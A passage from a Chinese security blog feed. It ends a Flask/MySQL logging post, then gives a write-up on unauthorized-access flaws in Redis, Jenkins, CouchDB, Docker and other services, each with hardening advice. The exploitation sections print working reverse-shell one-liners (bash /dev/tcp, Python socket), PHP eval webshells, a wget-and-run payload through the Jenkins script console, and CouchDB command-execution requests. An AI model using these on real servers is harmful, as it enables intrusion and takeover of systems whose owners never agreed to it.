<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">@app.before_request</div><div class="line">def before_request():</div><div class="line">    g.requestId = gen_requestId()</div><div class="line">    logger.info(&quot;Start Once Access, and this requestId is %s&quot; % g.requestId)</div></pre></td></tr></table></figure>
<h2 id="2、请求之后添加响应头与记录日志"><a href="#2、请求之后添加响应头与记录日志" class="headerlink" title="2、请求之后添加响应头与记录日志"></a>2、请求之后添加响应头与记录日志</h2><p>每次返回数据中，带上响应头，包含API版本和本次请求的requestId，以及允许所有域跨域访问API, 记录访问日志</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">@app.after_request</div><div class="line">def add_header(response):</div><div class="line">    response.headers[&quot;X-SaintIC-Media-Type&quot;] = &quot;saintic.v1&quot;</div><div class="line">    response.headers[&quot;X-SaintIC-Request-Id&quot;] = g.requestId</div><div class="line">    response.headers[&quot;Access-Control-Allow-Origin&quot;] = &quot;*&quot;</div><div class="line">    logger.info(json.dumps(&#123;</div><div class="line">        &quot;AccessLog&quot;: &#123;</div><div class="line">            &quot;status_code&quot;: response.status_code,</div><div class="line">            &quot;method&quot;: request.method,</div><div class="line">            &quot;ip&quot;: request.headers.get(&apos;X-Real-Ip&apos;, request.remote_addr),</div><div class="line">            &quot;url&quot;: request.url,</div><div class="line">            &quot;referer&quot;: request.headers.get(&apos;Referer&apos;),</div><div class="line">            &quot;agent&quot;: request.headers.get(&quot;User-Agent&quot;),</div><div class="line">            &quot;requestId&quot;: str(g.requestId),</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    ))</div><div class="line">    return response</div></pre></td></tr></table></figure>
<p><code>basicConfig</code>方法可以满足你在绝大多数场景下的使用需求，但是<code>basicConfig</code>有一个很大的缺点。调用<code>basicConfig</code>其实是给<code>root logger</code>添加了一个<code>handler(FileHandler )</code>，这样当你的程序和别的使用了 <code>logging</code>的第三方模块一起工作时，会影响第三方模块的<code>logger</code>行为。这是由logger的继承特性决定的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">logging.basicConfig(level=logging.DEBUG,</div><div class="line">                format=&apos;%(asctime)s %(levelname)s %(message)s&apos;,</div><div class="line">                datefmt=&apos;%a, %d %b %Y %H:%M:%S&apos;,</div><div class="line">                filename=&apos;logs/pro.log&apos;,</div><div class="line">                filemode=&apos;w&apos;)</div><div class="line"></div><div class="line">logging.debug(&apos;dddddddddd&apos;)</div></pre></td></tr></table></figure>
<h1 id="MySQL字符编码"><a href="#MySQL字符编码" class="headerlink" title="MySQL字符编码"></a>MySQL字符编码</h1><p>除了设置数据库的之外，由于dataset默认创建数据库和表的字符集不是utf8,所以需要自己设置，否则会中文乱码，所以需要修改表的字符集</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">my.cnf</div><div class="line">[client]</div><div class="line">default-character-set=utf8</div><div class="line">[mysqld]</div><div class="line">character-set-server=utf8</div><div class="line">collation-server=utf8_general_ci</div><div class="line">default-storage-engine=INNODB</div></pre></td></tr></table></figure>
<p>表的字符集</p>
<p><code>show create table tasks;</code></p>
<p><code>alter table tasks convert to character set utf8;</code></p>
]]></content>
      
        
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> Python </tag>
            
            <tag> MySQL </tag>
            
            <tag> Flask </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[未授权访问漏洞总结]]></title>
      <url>/2017/09/28/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今年5月，比特币勒索病毒WannaCry席卷全球，国内众多机构部门计算机系统瘫痪。根据之前应急响应的案例分析，以及一些安全报告统计，目前大部分的勒索病毒均利用未授权访问等通用漏洞进行植入、勒索，尤其是Redis、MongoDB等数据库的未授权访问漏洞尤其严重。<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/ransomware123.jpg" alt=""></p>
<h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><p><strong>未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。</strong></p>
<p>目前主要存在未授权访问漏洞的有：NFS服务，Samba服务，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，Redis，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo等，本文主要介绍一些目前比较常用的一些服务的未授权访问，欢迎大家补充！</p>
<h1 id="0x02-Redis未授权访问"><a href="#0x02-Redis未授权访问" class="headerlink" title="0x02 Redis未授权访问"></a>0x02 Redis未授权访问</h1><h2 id="2-1-漏洞描述"><a href="#2-1-漏洞描述" class="headerlink" title="2.1 漏洞描述"></a>2.1 漏洞描述</h2><p>Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p>
<h2 id="2-2-漏洞利用"><a href="#2-2-漏洞利用" class="headerlink" title="2.2 漏洞利用"></a>2.2 漏洞利用</h2><p><em>1、利用计划任务执行命令反弹shell</em><br>在redis以root权限运行时可以写crontab来执行命令反弹shell</p>
<p>先在自己的服务器上监听一个端口</p>
<blockquote>
<p>nc -lvnp 4444</p>
</blockquote>
<p>然后执行命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.2.6</div><div class="line">set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1\n&quot;</div><div class="line">config set dir /var/spool/cron/</div><div class="line">config set dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure></p>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/redis-11.png" alt=""><br><em>2、写ssh-keygen公钥登录服务器</em><br>在以下条件下，可以利用此方法</p>
<blockquote>
<p>1、Redis服务使用root账号启动<br>2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</p>
</blockquote>
<p>此方法具体参考：<a href="https://www.secpulse.com/archives/40406.html" target="_blank" rel="external">redis配置不当可直接导致服务器被控制</a><br><em>3、获取web服务的webshell</em><br>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。</p>
<p>执行以下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config set dir /var/www/html/</div><div class="line">config set dbfilename shell.php</div><div class="line">set x &quot;&lt;?php @eval($_POST[&apos;caidao&apos;]);?&gt;&quot;</div><div class="line">save</div></pre></td></tr></table></figure></p>
<p>即可将shell写入web目录<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/redis-5.png" alt=""></p>
<h2 id="2-3-漏洞加固"><a href="#2-3-漏洞加固" class="headerlink" title="2.3 漏洞加固"></a>2.3 漏洞加固</h2><p>可以配置redis.conf这个文件，在安装目录下</p>
<ul>
<li>默认只对本地开放</li>
</ul>
<blockquote>
<p>bind 127.0.0.1</p>
</blockquote>
<ul>
<li>添加登陆密码</li>
</ul>
<blockquote>
<p>requirepass www.secpulse.com</p>
</blockquote>
<ul>
<li>在需要对外开放的时候修改默认端口</li>
</ul>
<blockquote>
<p>port 2333</p>
</blockquote>
<ul>
<li>最后还可以配合iptables限制开放</li>
</ul>
<h1 id="0x03-Jenkins未授权访问"><a href="#0x03-Jenkins未授权访问" class="headerlink" title="0x03 Jenkins未授权访问"></a>0x03 Jenkins未授权访问</h1><h2 id="3-1-漏洞描述"><a href="#3-1-漏洞描述" class="headerlink" title="3.1 漏洞描述"></a>3.1 漏洞描述</h2><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
<h2 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2 漏洞利用"></a>3.2 漏洞利用</h2><p><em>1、Jenkins未授权访问可执行命令</em><br><a href="http://www.secpulse.com:8080/manage" target="_blank" rel="external">http://www.secpulse.com:8080/manage</a><br><a href="http://www.secpulse.com:8080/script" target="_blank" rel="external">http://www.secpulse.com:8080/script</a><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-1.png" alt=""><br><strong>println “ifconfig -a”.execute().text  执行一些系统命令</strong><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-2.png" alt=""><br><strong>直接wget下载back.py反弹shell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">println &quot;wget http://xxx.secpulse.com/tools/back.py -P /tmp/&quot;.execute().text</div><div class="line">println &quot;python /tmp/back.py 10.1.1.111 8080&quot;.execute().text</div><div class="line">back.py并不需要root权限</div></pre></td></tr></table></figure></p>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-3.png" alt=""><br><strong>不想反弹试试Terminal Plugin</strong><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-4.png" alt=""><br><em>2、Jenkins未授权访问写shell</em><br><strong>jenskins是java web项目,我们用java的File类写文件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">new File(&quot;c://temp//secpulse.txt&quot;).write(&quot;&quot;&quot;</div><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">&quot;&quot;&quot;);</div></pre></td></tr></table></figure></p>
<p>新建一个内容为1,2,3(每一行)的1.txt到c盘的temp文件夹,运行如下命令<code>println “powershell dir c:\temp”.execute().text</code>如果写成功,那么secpulse.txt就会在返回结果中!<br><strong>wget写webshell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">1. println &quot;wget http://shell.secpulse.com/data/t.txt -o /var/www/html/secpulse.php&quot;.execute().text</div><div class="line">2. new File(&quot;/var/www/html/secpulse.php&quot;).write(&apos;&lt;?php @eval($_POST[s3cpu1se]);?&gt;&apos;);</div><div class="line">3. def webshell = &apos;&lt;?php @eval($_POST[s3cpu1se]);?&gt;&apos;</div><div class="line">new File(&quot;/var/www/html/secpulse.php&quot;).write(&quot;$webshell&quot;);</div><div class="line">4. def execute(cmd) &#123;</div><div class="line">def proc =  cmd.execute()</div><div class="line">proc.waitFor()</div><div class="line">&#125;</div><div class="line">execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo -n &quot;&lt;?php @eval($&quot; &gt; /usr/local/nginx_1119/html/secpulse.php&apos; ] )</div><div class="line">execute( [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo &quot;_POST[s3cpu1se]);?&gt;&quot; &gt;&gt; /usr/local/nginx_1119/html/secpulse.php&apos; ] )</div><div class="line">//参数-n 不要在最后自动换行</div></pre></td></tr></table></figure></p>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/jenkins-5.png" alt=""><br>Result: 0 表示成功写入</p>
<p>Result: 1 表示目录不存在或者权限不足 写入失败</p>
<p>Result: 2 表示构造有异常 写入失败</p>
<p>具体其他详细利用方法参考：<a href="https://www.secpulse.com/archives/2166.html" target="_blank" rel="external">知其一不知其二之Jenkins Hacking</a></p>
<h2 id="3-3-漏洞加固"><a href="#3-3-漏洞加固" class="headerlink" title="3.3 漏洞加固"></a>3.3 漏洞加固</h2><ul>
<li>禁止把Jenkins直接暴露在公网</li>
<li>添加认证，建议使用用户矩阵或者与JIRA打通，JIRA设置密码复杂度</li>
</ul>
<h1 id="0x04-MongoDB未授权访问"><a href="#0x04-MongoDB未授权访问" class="headerlink" title="0x04 MongoDB未授权访问"></a>0x04 MongoDB未授权访问</h1><h2 id="4-1-漏洞描述"><a href="#4-1-漏洞描述" class="headerlink" title="4.1 漏洞描述"></a>4.1 漏洞描述</h2><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。</p>
<h2 id="4-2-漏洞利用"><a href="#4-2-漏洞利用" class="headerlink" title="4.2 漏洞利用"></a>4.2 漏洞利用</h2><p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/mongodb-1.png" alt=""></p>
<h2 id="4-3-漏洞加固"><a href="#4-3-漏洞加固" class="headerlink" title="4.3 漏洞加固"></a>4.3 漏洞加固</h2><ul>
<li><p>为MongoDB添加认证：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1)MongoDB启动时添加--auth参数</div><div class="line">2)给MongoDB添加用户：</div><div class="line">use admin  #使用admin库</div><div class="line">db.addUser(&quot;root&quot;, &quot;123456&quot;) #添加用户名root密码123456的用户</div><div class="line">db.auth(&quot;root&quot;,&quot;123456&quot;) #验证下是否添加成功，返回1说明成功</div></pre></td></tr></table></figure>
</li>
<li><p>禁用HTTP和REST端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface=false</div></pre></td></tr></table></figure>
</li>
<li><p>限制绑定IP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">启动时加入参数</div><div class="line">--bind_ip 127.0.0.1</div><div class="line">或在/etc/mongodb.conf文件中添加以下内容：</div><div class="line">bind_ip = 127.0.0.1</div></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="0x05-ZooKeeper未授权访问"><a href="#0x05-ZooKeeper未授权访问" class="headerlink" title="0x05 ZooKeeper未授权访问"></a>0x05 ZooKeeper未授权访问</h1><h2 id="5-1-漏洞描述"><a href="#5-1-漏洞描述" class="headerlink" title="5.1 漏洞描述"></a>5.1 漏洞描述</h2><p>Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。</p>
<h2 id="5-2-漏洞利用"><a href="#5-2-漏洞利用" class="headerlink" title="5.2 漏洞利用"></a>5.2 漏洞利用</h2><p>执行以下命令即可远程获取该服务器的环境：</p>
<blockquote>
<p>echo envi | nc ip port</p>
</blockquote>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/zookeeper-1.jpg" alt=""><br>直接连接：</p>
<blockquote>
<p>./zkCli.sh -server ip:port</p>
</blockquote>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/zookeeper-2.png" alt=""></p>
<h2 id="5-3-漏洞加固"><a href="#5-3-漏洞加固" class="headerlink" title="5.3 漏洞加固"></a>5.3 漏洞加固</h2><ul>
<li>禁止把Zookeeper直接暴露在公网</li>
<li>添加访问控制，根据情况选择对应方式（认证用户，用户名密码）</li>
<li>绑定指定IP访问</li>
</ul>
<h1 id="0x06-Elasticsearch未授权访问"><a href="#0x06-Elasticsearch未授权访问" class="headerlink" title="0x06 Elasticsearch未授权访问"></a>0x06 Elasticsearch未授权访问</h1><h2 id="6-1-漏洞描述"><a href="#6-1-漏洞描述" class="headerlink" title="6.1 漏洞描述"></a>6.1 漏洞描述</h2><p>Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口，可被非法操作数据</p>
<h2 id="6-2-漏洞利用"><a href="#6-2-漏洞利用" class="headerlink" title="6.2 漏洞利用"></a>6.2 漏洞利用</h2><p>漏洞检测：默认端口9200</p>
<p>相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作。</p>
<p><a href="http://x.x.x.x:9200/_nodes" target="_blank" rel="external">http://x.x.x.x:9200/_nodes</a></p>
<p><a href="http://x.x.x.x:9200/_river" target="_blank" rel="external">http://x.x.x.x:9200/_river</a><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/elasticsearch-1.png" alt=""></p>
<h2 id="6-3-漏洞加固"><a href="#6-3-漏洞加固" class="headerlink" title="6.3 漏洞加固"></a>6.3 漏洞加固</h2><ul>
<li>防火墙上设置禁止外网访问此端口。</li>
<li>使用Nginx搭建反向代理，通过配置Nginx实现对Elasticsearch的认证</li>
<li>在config/elasticsearch.yml中为9200端口设置认证：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http.basic.enabled     true     #开关，开启会接管全部HTTP连接</div><div class="line">http.basic.user     &quot;admin&quot;     #账号</div><div class="line">http.basic.password     &quot;admin_pw&quot;     #密码</div><div class="line">http.basic.ipwhitelist     [&quot;localhost&quot;, &quot;127.0.0.1&quot;]</div></pre></td></tr></table></figure>
<h1 id="0x07-Memcache未授权访问"><a href="#0x07-Memcache未授权访问" class="headerlink" title="0x07 Memcache未授权访问"></a>0x07 Memcache未授权访问</h1><h2 id="7-1-漏洞描述"><a href="#7-1-漏洞描述" class="headerlink" title="7.1 漏洞描述"></a>7.1 漏洞描述</h2><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p>
<h2 id="7-2-漏洞利用"><a href="#7-2-漏洞利用" class="headerlink" title="7.2 漏洞利用"></a>7.2 漏洞利用</h2><p>1、登录机器执行netstat -an |more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。</p>
<p>2、telnet <target> 11211，或nc -vv <target> 11211，提示连接成功表示漏洞存在<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/memcached-2.png" alt=""></target></target></p>
<h2 id="7-3-漏洞加固"><a href="#7-3-漏洞加固" class="headerlink" title="7.3 漏洞加固"></a>7.3 漏洞加固</h2><ul>
<li>设置memchached只允许本地访问</li>
<li>禁止外网访问Memcached 11211端口</li>
<li>编译时加上–enable-sasl，启用SASL认证</li>
</ul>
<h1 id="0x08-Hadoop未授权访问"><a href="#0x08-Hadoop未授权访问" class="headerlink" title="0x08 Hadoop未授权访问"></a>0x08 Hadoop未授权访问</h1><h2 id="8-1-漏洞描述"><a href="#8-1-漏洞描述" class="headerlink" title="8.1 漏洞描述"></a>8.1 漏洞描述</h2><p>由于服务器直接在开放了Hadoop机器HDFS的50070 web端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p>
<h2 id="8-2-漏洞利用"><a href="#8-2-漏洞利用" class="headerlink" title="8.2 漏洞利用"></a>8.2 漏洞利用</h2><p>主要HDFS和MapReduce的WebUI对应的服务端口。<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/Hadoop-1.png" alt=""><br>其中比较重要的是DataNode 默认端口50075开放的话，攻击者可以通过hdsf提供的restful api对hdfs存储数据进行操作。</p>
<p>restful api参考：<a href="http://hadoop.apache.org/docs/r1.0.4/webhdfs.html" target="_blank" rel="external">http://hadoop.apache.org/docs/r1.0.4/webhdfs.html</a></p>
<h2 id="8-3-漏洞加固"><a href="#8-3-漏洞加固" class="headerlink" title="8.3 漏洞加固"></a>8.3 漏洞加固</h2><ul>
<li>如无必要，关闭Hadoop Web管理页面</li>
<li>开启身份验证，防止未经授权用户访问</li>
<li>设置“安全组”访问控制策略，将Hadoop默认开放的多个端口对公网全部禁止或限制可信任的IP地址才能访问包括50070以及WebUI等相关端口，详细端口列表如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">a)HDFS</div><div class="line">NameNode 默认端口 50070</div><div class="line">DataNode 默认端口 50075</div><div class="line">httpfs 默认端口14000</div><div class="line">journalnode 默认端口 8480</div><div class="line">b)YARN（JobTracker）</div><div class="line">ResourceManager 默认端口8088</div><div class="line">JobTracker 默认端口 50030</div><div class="line">TaskTracker 默认端口 50060</div><div class="line">c)Hue 默认端口 8080</div><div class="line">d)YARN（JobTracker）</div><div class="line">master 默认端口 60010</div><div class="line">regionserver 默认端口60030</div><div class="line">e)hive-server2 默认端口 10000</div><div class="line">f)spark-jdbcserver 默认端口 10003</div></pre></td></tr></table></figure>
<h1 id="0x09-CouchDB未授权访问"><a href="#0x09-CouchDB未授权访问" class="headerlink" title="0x09 CouchDB未授权访问"></a>0x09 CouchDB未授权访问</h1><h2 id="9-1-漏洞描述"><a href="#9-1-漏洞描述" class="headerlink" title="9.1 漏洞描述"></a>9.1 漏洞描述</h2><p>CouchDB默认在5984端口开放Restful的API接口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关API对服务器上的数据进行任意的增删改查，其中通过API修改local.ini配置文件，可进一步导致执行任意系统命令，获取服务器权限！</p>
<h2 id="9-2-漏洞利用"><a href="#9-2-漏洞利用" class="headerlink" title="9.2 漏洞利用"></a>9.2 漏洞利用</h2><p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-7.png" alt=""><br>新增query_server配置，这里执行ifconfig命令</p>
<blockquote>
<p>curl -X PUT ‘<a href="http://x.x.x.x:5984/_config/query_servers/cmd" target="_blank" rel="external">http://x.x.x.x:5984/_config/query_servers/cmd</a>‘ -d ‘“/sbin/ifconfig &gt;/tmp/6666”‘</p>
</blockquote>
<p>新建一个临时表，插入一条记录<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-11.png" alt=""></p>
<blockquote>
<p>curl -X PUT ‘<a href="http://x.x.x.x:5984/vultest" target="_blank" rel="external">http://x.x.x.x:5984/vultest</a>‘</p>
</blockquote>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-2.png" alt=""></p>
<blockquote>
<p>curl -X PUT ‘<a href="http://x.x.x.x:5984/vultest/vul" target="_blank" rel="external">http://x.x.x.x:5984/vultest/vul</a>‘ -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’</p>
</blockquote>
<p>调用query_server处理数据<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-3.png" alt=""></p>
<blockquote>
<p>curl -X POST ‘<a href="http://x.x.x.x:5984/vultest/_temp_view?limit=11" target="_blank" rel="external">http://x.x.x.x:5984/vultest/_temp_view?limit=11</a>‘ -d ‘{“language”:”cmd”,”map”:””}’ -H ‘Content-Type: application/json’</p>
</blockquote>
<p><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-4.png" alt=""><br>当然你也可以直接执行其他命令，下载个其他什么的<br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-5.png" alt=""><br><img src="http://www.secpulse.com/wp-content/uploads/2017/09/couchdb-6.png" alt=""></p>
<h2 id="9-3-漏洞加固"><a href="#9-3-漏洞加固" class="headerlink" title="9.3 漏洞加固"></a>9.3 漏洞加固</h2><ul>
<li>指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 “bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</li>
<li>设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 中找到“[admins]”字段配置密码</li>
</ul>
<h1 id="0x10-Docker未授权访问"><a href="#0x10-Docker未授权访问" class="headerlink" title="0x10 Docker未授权访问"></a>0x10 Docker未授权访问</h1><h2 id="10-1-漏洞描述"><a href="#10-1-漏洞描述" class="headerlink" title="10.1 漏洞描述"></a>10.1 漏洞描述</h2><p>Docker Remote API是一个取代远程命令行界面（rcli）的REST API。通过 docker client 或者 http 直接请求就可以访问这个API，通过这个接口，我们可以新建container，删除已有的container，甚至是获取宿主机的shell</p>
<h2 id="10-2-漏洞利用"><a href="#10-2-漏洞利用" class="headerlink" title="10.2 漏洞利用"></a>10.2 漏洞利用</h2><p><a href="http://192.168.198.130:2375/v1.25/images/json" target="_blank" rel="external">http://192.168.198.130:2375/v1.25/images/json</a></p>
<p>可以获取到所有的 images 列表</p>
<p><a href="http://host:2375/containers/json" target="_blank" rel="external">http://host:2375/containers/json</a></p>
<p>会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，过Post包我们还可以新建、开启和关闭容器，其他操作比如拉取image等操作也都可以通过API调用完成。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ curl http://10.10.10.10:2375/containers/json</div><div class="line">[]</div><div class="line"></div><div class="line">docker -H=tcp://10.10.10.10:2375 ps         </div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div></pre></td></tr></table></figure>
<p>Docker remote Api未授权访问的攻击原理与之前的Redis未授权访问漏洞大同小异，都是通过向运行该应用的服务器写文件，从而拿到服务器的权限，常见的利用方法如下:</p>
<p><strong>1、启动一个容器，挂载宿主机的/root/目录，之后将攻击者的ssh公钥~/.ssh/id_rsa.pub的内容写到入宿主机的/root/.ssh/authorized_keys文件中，之后就可以用root账户直接登录了</strong></p>
<p><strong>2、启动一个容器，挂载宿主机的/etc/目录，之后将反弹shell的脚本写入到/etc/crontab中，攻击者会得到一个反弹的shell</strong>，其中反弹shell脚本的样例如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;*/1 * * * * root /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n&quot; &gt;&gt; /etc/crontab</div></pre></td></tr></table></figure></p>
<p>第2种利用方法也可以挂载var/spool/cron/目录，将反弹shell的脚本写入到/var/spool/cron/root（centos系统）或/var/spool/cron/crontabs/root(ubuntu系统)</p>
<h2 id="10-3-漏洞加固"><a href="#10-3-漏洞加固" class="headerlink" title="10.3 漏洞加固"></a>10.3 漏洞加固</h2><ul>
<li><p>在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">设置ACL，仅允许信任的来源IP连接；</div><div class="line">设置TLS认证，官方的文档为Protect the Docker daemon socket</div></pre></td></tr></table></figure>
</li>
<li><p>客户端连接时需要设置以下环境变量export DOCKER_TLS_VERIFY=1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">export DOCKER_CERT_PATH=~/.docker</div><div class="line">export DOCKER_HOST=tcp://10.10.10.10:2375</div><div class="line">export DOCKER_API_VERSION=1.12</div></pre></td></tr></table></figure>
</li>
<li><p>在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证</p>
</li>
</ul>
<h1 id="附：Python未授权访问脚本"><a href="#附：Python未授权访问脚本" class="headerlink" title="附：Python未授权访问脚本"></a>附：<a href="http://oa8y5guqs.bkt.clouddn.com/unauthorized_access.py" target="_blank" rel="external">Python未授权访问脚本</a></h1><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.secpulse.com/archives/55928.html" target="_blank" rel="external">https://www.secpulse.com/archives/55928.html</a></p>
